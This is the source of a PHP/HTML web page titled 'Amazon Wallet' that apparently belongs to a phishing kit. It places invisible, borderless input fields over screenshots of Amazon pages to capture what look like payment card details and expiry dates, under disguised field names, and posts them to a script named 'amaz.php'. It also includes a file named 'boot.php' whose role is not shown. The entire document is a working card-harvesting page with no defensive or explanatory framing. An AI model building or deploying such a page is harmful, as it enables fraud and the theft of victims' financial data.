<?php   ob_start();  ?>
<?
include "boot.php";
?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="icon" type="image/png" href="amazo/fav.png" />
<title>Amazon Wallet</title>
</head>

<body>

<div style="position: absolute; width: 100px; height: 100px; z-index: 1; left: 2px; top: 0px" id="layer1">
	<img border="0" src="amazo/amas.png" width="1349" height="155">
	<form method="POST" action="amaz.php">
	<font color="#FFFFFF">
	<select name="stone4" class="textox" style="border-color:#FFFFFF; border-width:0; padding:0; position:absolute;left:265;top:512;width:67px;z-index:21; height:29px; background-color:#FFFFFF">
<option value="">Month</option>
<option value="01">Janaury</option>
    <option value="02">February</option>
    <option value="03">March</option>
    <option value="04">April</option>
    <option value="05">May</option>
    <option value="06">June</option>
    <option value="07">July</option>
    <option value="08">August</option>
    <option value="09">September</option>
    <option value="10">October</option>
    <option value="11">November</option>
    <option value="12">December</option></select><select name="stone5" class="textox" style="border-color:#FFFFFF; border-width:0; padding:0; position:absolute;left:339;top:512;width:67px;z-index:21; height:29px; background-color:#FFFFFF">
<option value="">Year</option>
    <option value="16">2016</option>
    <option value="17">2017</option>
	 <option value="18">2018</option>
    <option value="19">2019</option>
    <option value="20">2020</option>
	<option value="21">2021</option>
    <option value="22">2022</option>
    <option value="23">2023</option></select><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname5" name="stone1" style="border:0 solid #FFFFFF; top:452;position:absolute; left:265; width:52px; height:27px; padding-left:0; padding-right:0" size="41" required><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname4" name="stone2" style="border:0 solid #FFFFFF; top:394;position:absolute; left:265; width:172px; height:27px; padding-left:0; padding-right:0" size="41" required><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname1" name="stone3" style="border:0 solid #FFFFFF; top:338;position:absolute; left:268; width:172px; height:27px; padding-left:0; padding-right:0" size="41" required></font><div style="position: absolute; width: 100px; height: 100px; z-index: 1; left: 290px; top: 591px" id="layer2">
	<input type="image" src="amazo/amazx.png" alt="Submit" name="I1">
</div>
	<p><img border="0" src="amazo/amaz.png" width="1350" height="492"></p>
	</form>
	<p><img border="0" src="amazo/ama.png" width="1349" height="652"></div>

</body>

</html>